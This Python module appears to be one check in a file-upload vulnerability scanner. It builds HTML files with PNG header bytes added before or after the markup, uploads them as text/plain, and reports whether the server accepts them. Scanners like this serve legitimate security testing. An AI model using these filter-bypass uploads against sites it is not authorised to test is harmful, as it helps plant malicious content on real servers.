import requests
import random
import string
import os

from requests_toolbelt.multipart.encoder import MultipartEncoder
from utils.utils import is_vulnerable

class C7_AddingResourceHeader:
    def execute(file_upload_url):
        headers, encoder = C7_AddingResourceHeader.prepending_resource_header()
        response = requests.post(file_upload_url, data=encoder, headers=headers)   

        encoder.fields["image"][1].close()

        if is_vulnerable(response.text, response.status_code) == False:
            headers, encoder = C7_AddingResourceHeader.appending_resource_header()
            response = requests.post(file_upload_url, data=encoder, headers=headers)
            
            encoder.fields["image"][1].close()

        status = "Vulnerable" if is_vulnerable(response.text, response.status_code) else "Not Vulnerable"

        return {
            "ID": "C7",
            "Name": "Adding Resource Header",
            "Score": "6.3",
            "Severity": "Medium",
            "Status": status,
        }
    
    def prepending_resource_header():
        user_agent = os.getenv("USER_AGENT")
        seed_path = "./resources/seed.html"
        image_path = "./resources/test.png"
        modified_seed_path = "./resources/modified/C7.1_modified_seed.html"
        boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))

        with open(modified_seed_path, "wb") as modified_seed:
            with open(image_path, "rb") as image:
                with open(seed_path, "rb") as seed:
                    modified_seed.write(image.read()[:1024])
                    modified_seed.write(seed.read())
                    seed.close()
                image.close()
            modified_seed.close()

        encoder = MultipartEncoder(
            fields={'image': ('C7.1_modified_seed.html', open(modified_seed_path, 'rb'), 'text/plain'), "submit": "submit"},
            boundary=boundary,
        )
        headers = {'Content-Type': encoder.content_type, 'User-Agent': user_agent, "Connection": "keep-alive"}

        return headers, encoder

    def appending_resource_header():
        user_agent = os.getenv("USER_AGENT")
        seed_path = "./resources/seed.html"
        image_path = "./resources/test.png"
        modified_seed_path = "./resources/modified/C7.2_modified_seed.html"
        boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))

        with open(modified_seed_path, "wb") as modified_seed:
            with open(image_path, "rb") as image:
                with open(seed_path, "rb") as seed:
                    modified_seed.write(seed.read())
                    modified_seed.write(image.read(8))
                    seed.close()
                image.close()
            modified_seed.close()

        encoder = MultipartEncoder(
            fields={'image': ('C7.2_modified_seed.html', open(modified_seed_path, 'rb'), 'text/plain'), "submit": "submit"},
            boundary=boundary,
        )
        headers = {'Content-Type': encoder.content_type, 'User-Agent': user_agent, "Connection": "keep-alive"}

        return headers, encoder
